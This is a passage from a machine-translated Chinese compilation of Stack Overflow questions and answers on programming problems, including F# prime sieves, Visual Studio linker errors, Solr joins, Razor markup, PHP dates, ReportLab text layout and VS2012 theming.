    sieve_prime [1;0] numbers 
```

在 FSI 中打开计时器后，我为 100000 获得了 4.33 秒的 CPU 时间……之后，一切都崩溃了。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-17T23:58:25.037

您的筛子功能很慢，因为您试图过滤掉高达`top_number`. 使用埃拉托色尼筛法，您只需要这样做，直到`sqrt(top_number)`剩余的数字本质上是素数。假设我们有`top_number = 1,000,000`，您的函数会`78498`进行几轮过滤（直到 的素数数`1,000,000`），而原始筛子只执行`168`几次（直到 的素数数`1,000`）。

您可以避免生成除 2 之外的偶数，因为 2 从一开始就不能是素数。而且，`sieve`和`sieve_prime`可以合并成一个递归函数。你可以使用轻量级`List.filter`而不是`List.choose`.

结合以上建议：

```
let sieve_primes top_number = 
    let numbers = [ yield 2
                    for i in 3..2..top_number -> i ]
    let rec sieve ns = 
        match ns with
        | [] -> []
        | x::xs when x*x > top_number -> ns
        | x::xs -> x::sieve (List.filter(fun y -> y%x <> 0) xs)
    sieve numbers 
```

在我的机器上，更新版本非常快，在 0.6 秒内完成`top_number = 1,000,000`.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-18T00:54:42.893

基于我的代码：stackoverflow.com/a/8371684/124259

在 fsi 中在 22 毫秒内获取前 100 万个素数 - 此时可能正在编译代码。

```
#time "on"

let limit = 1000000
//returns an array of all the primes up to limit
let table =
    let table = Array.create limit true //use bools in the table to save on memory
    let tlimit = int (sqrt (float limit)) //max test no for table, ints should be fine
    let mutable curfactor = 1;
    while curfactor < tlimit-2 do
        curfactor <- curfactor+2
        if table.[curfactor]  then //simple optimisation
            let mutable v = curfactor*2
            while v < limit do
                table.[v] <- false
                v <- v + curfactor
    let out = Array.create (100000) 0 //this needs to be greater than pi(limit)
    let mutable idx = 1
    out.[0]<-2
    let mutable curx=1
    while curx < limit-2 do
        curx <- curx + 2
        if table.[curx] then
            out.[idx]<-curx
            idx <- idx+1
    out 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-08-03T17:52:36.930

对于使用列表 (@pad) 的一般试验除法算法和使用埃拉托色尼筛 (SoE) (@John Palmer 和 @Jon Harrop) 选择用于筛选数据结构的数组，已经有几个很好的答案。但是，@pad 的列表算法并不是特别快，并且对于更大的筛选范围会“炸毁”，而@John Palmer 的数组解决方案稍微复杂一些，使用的内存比必要的多，并且使用外部可变状态，因此与程序是用 C# 等命令式语言编写的。

**EDIT_ADD：** 我编辑了下面的代码（带有行注释的旧代码）修改序列表达式以避免一些函数调用，以反映更多的“迭代器样式”，虽然它节省了 20% 的速度，但它仍然没有接近真正的 C# 迭代器，其速度与“滚动您自己的枚举器”最终 F# 代码的速度大致相同。我已经相应地修改了下面的时间信息。 **END_EDIT**

以下真正的 SoE 程序仅使用 64 KB 的内存来筛选多达一百万的素数（由于仅考虑奇数并使用压缩位 BitArray），并且仍然几乎与 @John Palmer 的程序一样快，大约需要 40 毫秒来筛选i7 2700K (3.5 GHz) 上一百万，只有几行代码：

```
open System.Collections
let primesSoE top_number=
  let BFLMT = int((top_number-3u)/2u) in let buf = BitArray(BFLMT+1,true)
  let SQRTLMT = (int(sqrt (double top_number))-3)/2
  let rec cullp i p = if i <= BFLMT then (buf.[i] <- false; cullp (i+p) p)
  for i = 0 to SQRTLMT do if buf.[i] then let p = i+i+3 in cullp (p*(i+1)+i) p
  seq { for i = -1 to BFLMT do if i<0 then yield 2u
                               elif buf.[i] then yield uint32(3+i+i) }
//  seq { yield 2u; yield! seq { 0..BFLMT } |> Seq.filter (fun i->buf.[i])
//                                          |> Seq.map (fun i->uint32 (i+i+3)) }
primesSOE 1000000u |> Seq.length;; 
```

由于序列运行时库的低效率以及在每个函数调用大约 28 个时钟周期并以大约 16 个函数调用返回的成本，几乎所有经过的时间都花费在最后两行枚举找到的素数上每次迭代。通过滚动我们自己的迭代器，这可以减少到每次迭代只有几个函数调用，但代码并不那么简洁；请注意，在以下代码中，除了筛选数组的内容和使用对象表达式的迭代器实现所必需的引用变量之外，没有暴露可变状态：

```
open System
open System.Collections
open System.Collections.Generic
let primesSoE top_number=
  let BFLMT = int((top_number-3u)/2u) in let buf = BitArray(BFLMT+1,true)
  let SQRTLMT = (int(sqrt (double top_number))-3)/2
  let rec cullp i p = if i <= BFLMT then (buf.[i] <- false; cullp (i+p) p)
  for i = 0 to SQRTLMT do if buf.[i] then let p = i+i+3 in cullp (p*(i+1)+i) p
  let nmrtr() =
    let i = ref -2
    let rec nxti() = i:=!i+1;if !i<=BFLMT && not buf.[!i] then nxti() else !i<=BFLMT
    let inline curr() = if !i<0 then (if !i= -1 then 2u else failwith "Enumeration not started!!!")
                        else let v = uint32 !i in v+v+3u
    { new IEnumerator<_> with
        member this.Current = curr()
      interface IEnumerator with
        member this.Current = box (curr())
        member this.MoveNext() = if !i< -1 then i:=!i+1;true else nxti()
        member this.Reset() = failwith "IEnumerator.Reset() not implemented!!!"
      interface IDisposable with
        member this.Dispose() = () }
  { new IEnumerable<_> with
      member this.GetEnumerator() = nmrtr()
    interface IEnumerable with
      member this.GetEnumerator() = nmrtr() :> IEnumerator }
primesSOE 1000000u |> Seq.length;; 
```

上面的代码在同一台机器上将素数筛选到一百万需要大约 8.5 毫秒，因为每次迭代的函数调用数量从大约 16 个大大减少到大约 3 个。这与以相同风格编写的 C# 代码的速度大致相同. 太糟糕了，我在第一个示例中使用的 F# 的迭代器样式不会像 C# 迭代器那样自动生成 IEnumerable 样板代码，但我想这就是序列的意图——只是它们在加速性能方面效率太低了由于被实现为序列计算表达式。

现在，只有不到一半的时间用于枚举主要结果，以便更好地利用 CPU 时间。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-10T21:02:58.503

> 我在这里做错了什么？

您已经实现了一种不同的算法，该算法遍历每个可能的值并用于`%`确定是否需要将其删除。您应该做的是逐步通过固定增量删除倍数。那将是渐近的。

您无法有效地单步执行列表，因为它们不支持随机访问，因此请使用数组。

# visual-studio - LNK1112 模块机器类型“X86”与目标机器类型“x64”冲突

> ID：12014227
> 
> 赞同：4
> 
> 时间：2012-08-17T23:06:12.983
> 
> 标签：visual-studio, qt, cmake

我正在使用 cmake-2.8.9-win32-x86。我想在 Visual Studio 2010 上构建 Qt qt-win-opensource-4.8.2-vs2010。我的电脑有 64 位系统。我认为由于 cmake 或 qt 都是 x86，因此我在构建时遇到了这个错误。LNK1112 模块机器类型“X86”与目标机器类型“x64”冲突。

如何解决这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T23:52:11.820

该错误告诉您链接器已使用指定 x64的[目标运行，而链接器正在读取的模块是为 x86 创建的。](http://msdn.microsoft.com/en-us/library/5wy54dk2%28v=vs.100%29.aspx)出了什么问题取决于您要做什么。

如果您尝试创建 x64 代码文件，则链接器目标是正确的，而模块是错误的。如果您尝试创建 x86 代码文件，则链接器目标错误且模块正确。

无论哪一项是错误的，您都必须更正——通过更改链接器目标或更改模块。如果模块错误，您可能最终使用 x86 版本的编译器而不是 x64 版本来编译它。

# join - solr join - 返回父子文档

> ID：12014232
> 
> 赞同：3
> 
> 时间：2012-08-17T23:07:10.333
> 
> 标签：join, solr

我正在使用 Solr 的（4.0.0-beta）连接功能来查询包含具有父/子关系的文档的索引。连接查询效果很好，但我只能在搜索结果中获得父文档。我相信这是预期的行为。

但是，是否有可能在搜索结果中同时返回父文档和子文档？（作为单独的搜索命中）。

例如：

父母：

```
SolrDocument{uid=m_1, media_id=1}<br/>
SolrDocument{uid=m_2, media_id=2}<br/>
SolrDocument{uid=m_3, media_id=3} 
```

孩子们：

```
SolrDocument(uid=p_1, page_id=1, fk_media_id=[1], partNumber=[abc, def, xyz]}<br/>
SolrDocument(uid=p_2, page_id=2, fk_media_id=[1,2], partNumber=[123, 456]}<br/>
SolrDocument(uid=p_3, page_id=3, fk_media_id=[1,3], partNumber=[100, 101]} 
```

我这样查询 partNumber：

```
{!join from=fk_media_id to=media_id}partNumber:abc 
```

正如预期的那样，我在结果中得到了父文档（uid=m_1）。但在这种情况下，我希望在结果中返回父母和孩子。那可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-30T16:20:11.463

不，这不可能。根据 Solr 维基：

> 对于习惯使用 SQL 的人来说，重要的是要注意 Solr 中的 Join 并不真正等同于 SQL Join，因为没有关于“从”连接的表的信息被传递到最终结果中。更合适的 SQL 类比是“内部查询”

[http://wiki.apache.org/solr/加入](http://wiki.apache.org/solr/Join)

您必须对所有数据进行非规范化才能执行此操作或运行两个不同的查询。

# c# - 在 WP7 上使用 ScaleTransform 后的奇怪行为

> ID：12014233
> 
> 赞同：0
> 
> 时间：2012-08-17T23:07:15.320
> 
> 标签：c#, silverlight, windows-phone-7, image-manipulation

我有两个相互之间的图像控件，我将一些像素的 alpha 通道设置为零，从上一个（这是彩色的）。但是在我“缩放”（ScaleTransform 的宽度）之后，将在已设置的像素周围看到一个“边框”。这是一个屏幕截图：

![在此处输入图像描述](../Images/d8be1a0d9f60f7e44b163af91d637321.png)

这是代码：

```
 <Grid Name="grdPhotos">
            <Image Stretch="None" Source="picture_grayscale.jpg" Name="photo1" HorizontalAlignment="Left" VerticalAlignment="Top" />
            <Image Stretch="None" Source="picture.jpg" Name="photo2" MouseLeftButtonDown="photo2_MouseLeftButtonDown" HorizontalAlignment="Left" VerticalAlignment="Top" />
        </Grid> 
```

* * *

```
 private void photo2_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
    {
        var photo = photo2.Source as WriteableBitmap; // A WriteableBitmap is created before from the Source BitmapImage
        for (int x = 100; x < 200; x++)
        {
            for (int y = 100; y < 200; y++)
            {
                int index = Convert.ToInt32(photo.PixelWidth * y + x);
                if (index > 0 && index < photo.Pixels.Length)
                    SetPixelAlphaChannel(ref photo.Pixels[index], 0);
            }
        }

        var transform = new ScaleTransform { ScaleX = 2, ScaleY = 2 };
        photo1.RenderTransform = photo2.RenderTransform = transform;
    }

    public void SetPixelAlphaChannel(ref int pixel, byte value)
    {
        var color = ColorFromPixel(pixel);
        if (color.A == value)
            return;

        color.A = value;
        pixel = ColorToPixel(color);
    }

    private Color ColorFromPixel(int pixel)
    {
        var argbBytes = BitConverter.GetBytes(pixel);
        return new Color { A = argbBytes[3], R = argbBytes[2], G = argbBytes[1], B = argbBytes[0] };
    }
    private int ColorToPixel(Color color)
    {
        var argbBytes = new byte[] { color.B, color.G, color.R, color.A };
        return BitConverter.ToInt32(argbBytes, 0);
    } 
```

为什么是这样？或者如何在没有这个“边框”的情况下实现缩放功能？非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T06:35:03.177

当您缩放图像时，像素值将被[插值](http://en.wikipedia.org/wiki/Image_scaling#Scaling_methods)，这将导致边框中的像素是您观察到的将透明像素与它们的非透明邻居进行插值的结果。不幸的是，您无法控制渲染变换的插值行为。您将不得不自己执行此操作，可能通过`WriteableBitmap`.

# java - Google Drive 会话到期

> ID：12014237
> 
> 赞同：1
> 
> 时间：2012-08-17T23:07:55.357
> 
> 标签：java, google-drive-api

据我了解，在使用 Drive Java API 时，建议构建 Drive 类的实例，然后将其存储，以便其他线程可以共享它。如果持有此对 Drive 实例的引用的进程是一个长时间运行的进程（即无限期），会话（？）最终会过期并再次要求身份验证，还是每次请求都传递凭据？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T01:29:27.070

Drive API 使用 OAuth 2.0 作为授权机制，这涉及在每个请求中传递一个访问令牌。

访问令牌是短暂的，大约 1 小时后过期。发生这种情况时，您的应用程序必须使用用户首次授权应用程序时检索到的刷新令牌来请求新的访问令牌。

所有这些都由 Google Drive 的 Java 客户端库自动执行，并记录在[https://developers.google.com/drive/about-auth](https://developers.google.com/drive/about-auth)

该文档还包括一个完整的 Google Drive Java 示例应用程序，您可以将其用作参考：

[https://developers.google.com/drive/examples/java](https://developers.google.com/drive/examples/java)

# android - 是否可以在 Android 上伪造传入的短信？

> ID：12014239
> 
> 赞同：5
> 
> 时间：2012-08-17T23:08:41.260
> 
> 标签：android, android-intent, sms, android-contentprovider

在某种情况下，我希望我的应用能够“伪造”用户设备上的传入短信，作为一种通知。当我通常使用 Twilio 向我的用户发送文本但我知道他们已经拥有我的应用程序时，这会节省我的钱。有没有办法做到这一点？我想这与意图和内容提供者有关，但我真的不知道从哪里开始。

澄清一下：我对 Android 并不陌生，我确实尊重所有正常的通知方法。但是，我的应用程序可以选择接收短信，我希望能够免费触发它们而不是付费。这是针对特定于 SMS 的用途，而不是作为普通通知的替代品。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T02:02:29.617

是的（尽管我真的不支持这样做），理论上可以通过创建和广播正确的意图来实现。具体来说，`android.provider.Telephony.SMS_RECEIVED`任何正在收听 SMS 消息的人都会收到他们的意图，包括默认的 SMS 应用程序。这将反过来导致显示通知。

综上所述，我只在系统进程内的自定义版本的 Android 中完成过此操作。我真的不确定通用应用程序是否可以做到这一点（事实上，我有点怀疑）。另一个需要注意的是，您需要将数据表示为 PDU，它代表 SMS 消息的二进制数据格式。你可以查一下，但这很重要。

更好的方法是让您的应用程序在托盘中显示通知，就像表现良好的应用程序应该通知用户事件一样。看看[`Notification`](http://developer.android.com/reference/android/app/Notification.html) 课堂。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T01:52:09.370

如果您安装`ApiDemos-debug.apk`通常随您选择的 SDK 平台一起安装的 apk，您将在

```
<Api Demos> > App > Notification > IncomingMessage 
```

这个包的完整源代码通常在

```
<SDK root>/samples/android-xx/ApiDemos 
```

# php - php - 使用有意义的键名创建动态数组的快捷方式

> ID：12014240
> 
> 赞同：0
> 
> 时间：2012-08-17T23:08:43.727
> 
> 标签：php, regex

我有一些逻辑可以根据正则表达式中的匹配项构建多维数组。我使用分隔符调用explode函数。一切正常，我的数组如下所示：

```
 Array ( 
  [0] => 
    Array ( 
        [0] => A1 
        [1] => 100/1000T 
        [2] => No 
        [3] => Yes 
        [4] => Down 
        [5] => 1000FDx 
        [6] => Auto 
        [7] => off 
        [8] => 0 
    ) 
[1] => Array ( 
        [0] => A2 
        [1] => 100/1000T 
        [2] => No 
        [3] => Yes 
        [4] => Down 
        [5] => 1000FDx 
        [6] => Auto 
        [7] => off 
        [8] => 0 
      ) etc.etc... 
```

为了使前端的代码保持“哑”，我想将键从数字更改为代表值的字符串。这些字符串将用作表格中的列标题。例如：

```
 Array ( 
  [0] => 
    Array ( 
        [port] => A1 
        [Type] => 100/1000T 
        [Alert] => No 
        [Enabled] => Yes 
        [Status] => Down 
        [Mode] => 1000FDx 
        [MDIMode] => Auto 
        [FlowCtrl] => off 
        [BcastLimit] => 0 
    ) 
[1] => Array ( 
        [port] => A2 
        [Type] => 100/1000T 
        [Alert] => No 
        [Enabled] => Yes 
        [Status] => Down 
        [Mode] => 1000FDx 
        [MDIMode] => Auto 
        [FlowCtrl] => off 
        [BcastLimit] => 0         
               ) etc.etc... 
```

下面是生成这个数组的代码：

```
 $portdetailsArray = array();
  foreach ($data as $portdetails) {
    $pattern = '/(\s+)([0-9a-z]*)(\s+)(100\/1000T|10|\s+)(\s*)(\|)(\s+)(\w+)(\s+)(\w+)(\s+)(\w+)(\s+)(1000FDx|\s+)(\s*)(\w+)(\s*)(\w+|\s+)(\s*)(0)/i';

   if (preg_match($pattern, $portdetails, $matches)) {

        $replacement = '$2~$4~$8~$10~$12~$14~$16~$18~$20';
        $portdetails= preg_replace($pattern, $replacement, $portdetails);
        array_push($portdetailsArray, explode('~',$portdetails));
   }

} 
```

我想我可以手动循环遍历我的字符串，而不是使用explode函数。每次我找到一个“~”时，我都知道这是一个新字段的开始，所以我可以手动添加它们的键/值对。但我只是想知道是否有人对其他方法有想法。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T23:19:40.733

要回答您的原始问题，您可以使用该`array_combine`功能来更换密钥。

```
$row = explode('~',$portdetails);
$row = array_combine(array(
       'port',
       'Type',
       'Alert',
       'Enabled',
       'Status',
       'Mode',
       'MDIMode',
       'FlowCtrl',
       'BcastLimit'), $row); 
```

但更好的是，您应该使用更清晰的（在这种情况下，冗长更清晰）

```
if (preg_match($pattern, $portdetails, $matches)) {
    array_push($portdetailsArray, array(
       'port' => $matches[2],
       'Type' => $matches[4],
       'Alert' => $matches[8],
       'Enabled' => $matches[10],
       'Status' => $matches[12],
       'Mode' => $matches[14],
       'MDIMode' => $matches[16],
       'FlowCtrl' => $matches[18],
       'BcastLimit' => $matches[20]));
} 
```

# python - Python 中的 CSV 合并（多个文件）

> ID：12014243
> 
> 赞同：0
> 
> 时间：2012-08-17T23:09:08.623
> 
> 标签：python, csv, python-2.7

我最近开始学习 Python。我遇到了一个问题，并想是否有人可以帮助我。我正在尝试合并位于同一目录中的 .csv 文件。每天都会创建一个具有今天日期的目录，其中还有一个目录用于城市，城市目录具有以下文件。

```
vkSummary1abc   
vkSummary2gbb   
vkSummary3def   
vkDetail1abc
vkDetail2gbb   
vkDetail3def 
```

我正在尝试合并所有 vkDetail 文件。目录中可以有 3 个或更多文件。脚本应该首先询问用户他试图在哪个日期和城市运行脚本，并且应该从那个日期目录和城市目录合并所有详细文件。标头应该只存在一次，然后是数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-21T20:21:01.283

一旦您从用户那里获得日期和城市，您就可以使用它`glob.glob()`来获取相应目录中的所有文件。从那里依次打开每个文件，跳过标题行，然后写入结果文件。

# javascript - 我可以测试jsonp ajax调用的任何公共api吗？

> ID：12014245
> 
> 赞同：4
> 
> 时间：2012-08-17T23:09:31.150
> 
> 标签：javascript, jquery, ajax

除了 Twitter，我想知道是否有人知道任何公共 Web API，我可以尝试使用 jsonp 协议进行 ajax 调用？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-17T23:10:56.790

jsfiddle 提供了一个非常有用的回显工具：http: [//doc.jsfiddle.net/use/echo.html](http://doc.jsfiddle.net/use/echo.html)

> JSONP 网址：http: [//jsfiddle.net/echo/jsonp/](http://jsfiddle.net/echo/jsonp/)
> 
> 必须通过 GET 提供数据。jsFiddle 将响应请求中给出的所有数据。它使用带有主机和协议的 URL，因为它是从不同的域加载的。回调和延迟将不会返回。
> 
> jsonp 函数的回调名称 delay 可选，以秒为单位返回数据的时间

# java - 使用任何主机的 IP 地址构造 InetSocketAddress 的正确方法是什么？

> ID：12014247
> 
> 赞同：13
> 
> 时间：2012-08-17T23:09:35.243
> 
> 标签：java, sockets, networking, tcp, network-programming

我想创建一个 InetSocketAddress，但无论我得到一个主机：端口还是 ip：端口，我都想正确地做到这一点。我看到它有两个构造函数，一个用于主机（字符串），另一个用于 IP（InetAddress）。我是否必须确定自己是否获得了 IP 或 HOST 才能在这两个构造函数之间进行选择？我在这里错过了什么吗？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-08-18T01:01:51.300

您可以从 Javadoc 中推断，并在源代码中查看`new InetSocketAddress(String hostname, int port)`调用`InetAddress.getByName(hostname)`，它会按照文档为您整理所有内容。

因此，您发布的问题实际上并不存在。只需传递您获得的任何字符串，无论是主机名还是 IP 地址。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-17T23:17:08.317

我不完全确定你的要求是什么，但是，我在我的电脑上做了这个快速测试，没有任何问题

```
try {

    String ipAddress = ""; // Add your own
    String hostName = ""; // Add your own

    int port = ...; // You'll need some sort of service to connect to

    InetSocketAddress byAddress1 = new InetSocketAddress(ipAddress, port);
    InetSocketAddress byAddress2 = new InetSocketAddress(InetAddress.getByName(ipAddress), port);

    InetSocketAddress byName1 = new InetSocketAddress(hostName, port);
    InetSocketAddress byName2 = new InetSocketAddress(InetAddress.getByName(hostName), port);

} catch (UnknownHostException unknownHostException) {
    unknownHostException.printStackTrace();
} 
```

更大的问题是，期望得到什么作为输入？IP地址、主机名或其他形式？？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T23:26:07.863

您必须确定传递给构造函数的字符串是 IP 还是主机名。我会用 IP 地址的正则表达式来做。如果失败，则可能是主机名。

IP 地址和主机名都是字符串，因此您将只使用一个构造函数。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-09-10T15:51:08.303

另外值得一提的是，如果您不知道您的**dns**名称或**ip**，您可以简单地使用仅带有端口的构造函数。

```
new InetSocketAddress(8080) 
```

它在内部调用`InetAddress.anyLocalAddress()`

# c# - Razor 缺少匹配的结束标记

> ID：12014253
> 
> 赞同：4
> 
> 时间：2012-08-17T23:10:51.743
> 
> 标签：c#, html, asp.net-mvc, razor, html-table

我对相当复杂的表和剃刀标签有一些问题。

我把最“@”去掉了。（例如在 if 等前面）。

我玩了大约 30 分钟，但我似乎找不到办法。我总是会收到/或类似没有任何结束标签的错误。我玩过@: 等等，但就是不明白。

如果有人可以帮助我，并且如果有人可以对 @: 标签给出一个体面的解释，我将不胜感激。

```
<div>
    if (Model.dsInfoUser.Tables[0].Rows.Count != 0)
    {
        <table>
            for (int i = 0; i < Model.dsInfoUser.Tables[0].Rows.Count; i++)
            {
                if (i % 2 == 1)
                {
                    <tr class="tableEven">
                }
                else
                {
                    <tr class="tableOdd">
                }
                    @*Picture*@
                    if (i == 0)
                    {
                        <td rowspan="@Model.dsInfoUser.Tables[0].Rows.Count" class="tblPicture"><img src="@Model.dsInfoUser.Tables[0].Rows[i][1]" /></td>
                    }
                    <td>
                        @Model.dsInfoUser.Tables[0].Rows[i][0].ToString()
                    </td> 
                    <td>
                        @Model.dsInfoUser.Tables[0].Rows[i][1].ToString()
                    </td> 
                </tr> 
                if (i == 5)
                {
                    <tr>
                        <td>
                            <text>Member Of:</text>
                        </td>
                            <td>
                                <table>
                                    for (int j = 0; j < Model.dsInfoUser.Tables[1].Rows.Count; j++)
                                    {
                                    if (j % 2 == 1)
                                    {
                                        <tr class="tableEven">
                                    }
                                    else
                                    {
                                        <tr class="tableOdd">
                                    }
                                        <td rowspan="3">
                                            <div style="width: 400px; overflow-y: scroll">

                                            </div>
                                        </td>
                                    </tr>
                                </table>
                            </td>
                    </tr>
                }
        </table>
    }
</div> 
```

对于任何想知道的人，这里是固定版本：

```
<div>
    @if (Model.dsInfoUser.Tables[0].Rows.Count != 0)
    {
        <table>
            @for (int i = 0; i < Model.dsInfoUser.Tables[0].Rows.Count; i++)
            {
                <tr class="@(i % 2 == 1 ? "tableEven" : "tableOdd")">
                    @if (i == 0)
                    {
                        <td rowspan="@Model.dsInfoUser.Tables[0].Rows.Count" class="tblPicture"><img src="@Model.dsInfoUser.Tables[0].Rows[i][1]" /></td>
                    }
                    <td>
                        @Model.dsInfoUser.Tables[0].Rows[i][0].ToString()
                    </td> 
                    <td>
                        @Model.dsInfoUser.Tables[0].Rows[i][1].ToString()
                    </td> 
                </tr> 
                    if (i == 5)
                    {
                    <tr>
                        <td>
                            <text>Member Of:</text>
                        </td>
                            <td>
                                <table>
                                    @for (int j = 0; j < Model.dsInfoUser.Tables[1].Rows.Count; j++)
                                    {
                                        <tr class="@(i % 2 == 1 ? "tableEven" : "tableOdd")">
                                            <td rowspan="3">
                                                <div style="width: 400px; overflow-y: scroll">
                                                </div>
                                            </td>
                                        </tr>
                                    }
                                </table>
                            </td>
                    </tr>
                    }
            }
        </table>
    }
</div> 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-17T23:20:43.507

你不能那样做。Razor 期望具有适当的层次结构。特别是，这是非法的：

```
if(condition)
{
    <foo>
}
else
{
    <foo>
}
</foo> 
```

尽管我们都知道这将是一个格式良好的`<foo></foo>`，但 razor 并不这么认为。它看到 2 unclosed`<foo>`和一个**完全不相关** `</foo>`的东西。

在您的情况下，执行此操作的方法是：

```
<tr class="@(i % 2 == 1 ? "tableEven" : "tableOdd")">
   <td>...</td>
</tr> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T23:23:40.580

```
if (i % 2 == 1)
{
    <tr class="tableEven">
}
else
{
    <tr class="tableOdd">
} 
```

可能是什么给你带来麻烦

您应该能够将其重写为

```
 string className = i%2 == 1 ? "tableEven" : "tableOdd"
 <tr class="@className"> 
```

并使解析器满意

# python - ReportLab：大字体的文本挤在段落中

> ID：12014254
> 
> 赞同：7
> 
> 时间：2012-08-17T23:10:52.560
> 
> 标签：python, django, pdf, reportlab, paragraph

使用 ReportLab，我想渲染一个大字体的文本块。现在，我的代码将文本放在一个段落中，这样它就可以被自动换行。但是，文本在渲染时会被挤在一起。

似乎没有考虑我为 Paragraph 对象指定的高度。我可以添加段落的属性来解决这个问题吗？

我的代码如下：

```
from reportlab.pdfgen import canvas
from reportlab.lib.units import inch 
from reportlab.platypus import Paragraph
from  reportlab.lib.styles import ParagraphStyle
from reportlab.lib.enums import TA_CENTER

doc = canvas.Canvas('test.pdf')
p = ParagraphStyle('test')
p.textColor = 'black'
p.borderColor = 'black'
p.borderWidth = 1
p.alignment = TA_CENTER
p.fontSize = 100

para = Paragraph("THIS IS A REALLY LONG AND BIG STRING OF TEXT RIGHT HERE!!!!!", p)
para.wrapOn(doc,1200,1000)
para.drawOn(doc, 0.5*inch, 6*inch)
doc.save() 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-13T11:01:31.327

答案是将前导属性设置为 120：

```
p.leading = 120 
```

默认情况下，样式的 fontSize 为 10，前导值为 12。leading 参数指定从一个文本行前进到下一个文本行时向下移动的距离。

# php - PHP 的日期早于 1 天

> ID：12014257
> 
> 赞同：3
> 
> 时间：2012-08-17T23:11:33.597
> 
> 标签：php, mysql, date

我需要检查日期是否比 PHP 中的特定时间早 1 天。我尝试了下面的代码，但它似乎不起作用。下面的代码似乎不起作用。这实际上让我想到了两个问题。

1）为什么下面的代码不起作用？

2）这种方法有效还是我应该研究替代方法？

```
if (date("Y-m-j H:i:s", strtotime('1 day ago')) < date("Y-m-j H:i:s", strtotime($act['lpwdchange']))) {
    // Code Here
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-17T23:13:58.780

使用负...

```
strtotime('-1 day') 
```

但是如果你已经有一个时间存储在`$act['lpwdchange']`

```
if (strtotime('-1 day') < strtotime($act['lpwdchange'])) {
    // Code Here
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-17T23:18:54.137

比较日期的最简单方法可能是将它们转换为时间戳，然后比较它们：

```
if(strtotime('-1 day') < strtotime($act['lpwdchange'])); 
```

你的不起作用的原因可能是因为它正在比较字符串，这可能会导致未定义的行为。

# visual-studio-2012 - 我在哪里可以找到 VS2012 的主题

> ID：12014258
> 
> 赞同：161
> 
> 时间：2012-08-16T06:22:31.057
> 
> 标签：visual-studio-2012

好吧，VS2012 上的颜色缺失很严重。

有没有什么地方我可以得到一个主题包或其他东西，这样它实际上看起来很合理？我真的很喜欢 VS2010 的外观。然而，新的让我想起了[1984 年](http://en.wikipedia.org/wiki/Nineteen_Eighty-Four)。

当我们这样做的时候，有没有办法让它停止对我大喊大叫？全大写菜单很难阅读。*[注意：caps 已解决，感谢 Konamiman]*

* * *

## 回答 #1

> 赞同：145
> 
> 时间：2012-08-16T11:13:46.110

是的，幸运的是，您可以通过破解注册表将 Visual Studio 2012 ALL CAPS 菜单恢复为普通菜单：

1.  启动 regedit 并导航到 `HKEY_CURRENT_USER\Software\Microsoft\VisualStudio\11.0\General`
2.  创建一个`SuppressUppercaseConversion`以值 1 命名的 DWORD 值。

**注意：**正如 Yahoo Serious 指出的答案中所解释的，`VisualStudio`注册表项名称上的部分应更改`VSWinExpress`为 Visual Studio Express 和`VWDExpress`Visual Studio Express for Web。

**更新：**

我已经在另一台机器上应用了这个 hack，起初它没有用。事实证明，我通过双击从该响应中选择了键名，然后复制它，然后将其粘贴到 regedit 中。好吧，这样做我无意中创建了名称中带有尾随空格的键！因此它没有用。

因此，如果您应用此 hack 并且它似乎不起作用，请确保密钥名称中没有尾随空格。

* * *

## 回答 #2

> 赞同：105
> 
> 时间：2012-09-18T02:15:12.307

**专为 2012 年推出的**新主题编辑器：

[http://visualstudiogallery.msdn.microsoft.com/366ad100-0003-4c9a-81a8-337d4e7ace05](http://visualstudiogallery.msdn.microsoft.com/366ad100-0003-4c9a-81a8-337d4e7ace05)

带有 VS 2010 风格的蓝色和其他一些...

* * *

## 回答 #3

> 赞同：34
> 
> 时间：2013-01-03T08:12:53.093

**这是我安装的 VS2012 的照片，**它几乎看起来像我们都习惯的熟悉的 2010。这让我感觉又正常了！

![在此处输入图像描述](../Images/2efd3f8af994e03432ecbcfdb2fb324d.png)

这正是我如何一步一步地做到这一点的：

1) 关闭 Visual Studio 的所有实例

2)**下载[vsip](http://vsip.codeplex.com/)**并将其解压缩到临时目录。（截至 2013 年 1 月 3 日，当前版本为 1.5.2）

3）使用“以管理员身份运行”**打开命令提示符**

4) 转到临时目录并**运行 VSIP.exe** - 这将运行一个接受命令的交互式程序。
  4a) 键入“ **backup --version=2012** ” - 这将备份您所有的 VS2012 UI dll，以防万一出现问题并且您想卸载 VSIP。
  4b) 键入“ **extract** ” - 这将从您安装的 VS2010 中提取所有旧图标（根据 VS2010 许可证，VSIP 无法分发这些图标，因此我们必须进行本地安装才能从中提取它们）。
  4c) 键入“ **inject** ” - 这会将上一步中的所有旧 2010 图标注入 VS2012 DLL。
  4d) 输入“**菜单 -n** ”

5)**下载并安装[NiceVS](http://sourceforge.net/projects/nicevs/files/)** - 不要下载日期为 10/14 的版本，否则您将丢失图标。截至 2013 年 1 月 3 日，我下载了名为*"NiceVS.0.8.1.1 Beta.Full.vsix"*的文件。

